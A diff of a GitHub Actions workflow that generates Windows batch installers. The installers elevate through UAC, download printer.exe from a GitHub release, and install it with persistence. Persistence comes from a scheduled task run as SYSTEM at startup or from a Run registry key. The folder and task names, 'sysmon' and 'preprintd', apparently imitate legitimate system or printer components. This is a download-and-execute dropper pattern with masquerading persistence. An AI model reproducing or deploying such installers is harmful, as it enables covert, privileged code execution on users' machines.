@@ -55,14 +55,14 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GH_TOKEN || secrets.GITHUB_TOKEN }}
         run: |
-          $key_prompt = 'echo PreConnect Setup`n:ask`nset "k="`nset /p "k=Enter Worker Key: "`nif not defined k goto ask'
+          $key_prompt = 'echo PreConnect Setup`n:ask`nset "k="`nset /p "k=Enter Worker Key: "`nif "%k%"=="" goto ask'
 
           @(
             '@echo off',
-            'setlocal EnableDelayedExpansion',
+            'setlocal',
             'net session >nul 2>&1',
             'if %errorlevel% neq 0 (',
-            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/c \"\"%~f0\"\"'' -Verb RunAs"',
+            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/k \"\"%~f0\"\"'' -Verb RunAs"',
             '  exit /b',
             ')',
             'cd /d "%~dp0"',
@@ -71,23 +71,28 @@ jobs:
             'set "d=%ProgramData%\sysmon"',
             'if not exist "%d%" mkdir "%d%"',
             'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri ''https://github.com/sabbirba/preconnect/releases/latest/download/printer.exe'' -OutFile ''%d%\printer.exe'' -UseBasicParsing"',
-            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes(''%k%''),$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
+            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "$raw=[System.Text.Encoding]::UTF8.GetBytes($env:k); Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect($raw,$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
             'schtasks /Create /TN "sysmon" /TR "\"%d%\printer.exe\" \"%dpapi%\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
             'schtasks /Run /TN "sysmon" >nul',
+            'echo Setup completed successfully.',
+            'timeout /t 3 >nul',
             'endlocal'
           ) | Set-Content -Path "admin.bat" -Encoding ASCII
 
           @(
             '@echo off',
-            'setlocal EnableDelayedExpansion',
+            'setlocal',
+            'cd /d "%~dp0"',
             $key_prompt,
             'taskkill /F /IM printer.exe >nul 2>&1',
             'set "d=%LOCALAPPDATA%\sysmon"',
             'if not exist "%d%" mkdir "%d%"',
             'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri ''https://github.com/sabbirba/preconnect/releases/latest/download/printer.exe'' -OutFile ''%d%\printer.exe'' -UseBasicParsing"',
-            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes(''%k%''),$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
+            'for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "$raw=[System.Text.Encoding]::UTF8.GetBytes($env:k); Add-Type -AssemblyName System.Security; $e=[System.Security.Cryptography.ProtectedData]::Protect($raw,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); ''DPAPI:'' + [Convert]::ToBase64String($e)"`) do set "dpapi=%%A"',
             'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sysmon" /t REG_SZ /d "\"%d%\printer.exe\" \"%dpapi%\"" /f >nul',
             'start "" "%d%\printer.exe" "%dpapi%"',
+            'echo Setup completed successfully.',
+            'timeout /t 3 >nul',
             'endlocal'
           ) | Set-Content -Path "user.bat" -Encoding ASCII
 
@@ -107,10 +112,10 @@ jobs:
 
           @(
             '@echo off',
-            'setlocal EnableDelayedExpansion',
+            'setlocal',
             'net session >nul 2>&1',
             'if %errorlevel% neq 0 (',
-            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/c \"\"%~f0\"\"'' -Verb RunAs"',
+            '  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/k \"\"%~f0\"\"'' -Verb RunAs"',
             '  exit /b',
             ')',
             'cd /d "%~dp0"',
@@ -124,12 +129,15 @@ jobs:
             'setx /M DEF_QUEUE "secure" >nul 2>&1',
             'schtasks /Create /TN "preprintd" /TR "\"%d%\preprintd.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul',
             'schtasks /Run /TN "preprintd" >nul',
+            'echo Setup completed successfully.',
+            'timeout /t 3 >nul',
             'endlocal'
           ) | Set-Content -Path "preprintd-admin.bat" -Encoding ASCII
 
           @(
             '@echo off',
-            'setlocal EnableDelayedExpansion',
+            'setlocal',
+            'cd /d "%~dp0"',
             $key_prompt,
             'taskkill /F /IM preprintd.exe >nul 2>&1',
             'set "d=%LOCALAPPDATA%\preprintd"',
@@ -140,6 +148,8 @@ jobs:
             'setx DEF_QUEUE "secure" >nul 2>&1',
             'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "preprintd" /t REG_SZ /d "\"%d%\preprintd.exe\"" /f >nul',
             'start "" "%d%\preprintd.exe"',
+            'echo Setup completed successfully.',
+            'timeout /t 3 >nul',
             'endlocal'
           ) | Set-Content -Path "preprintd-user.bat" -Encoding ASCII
 
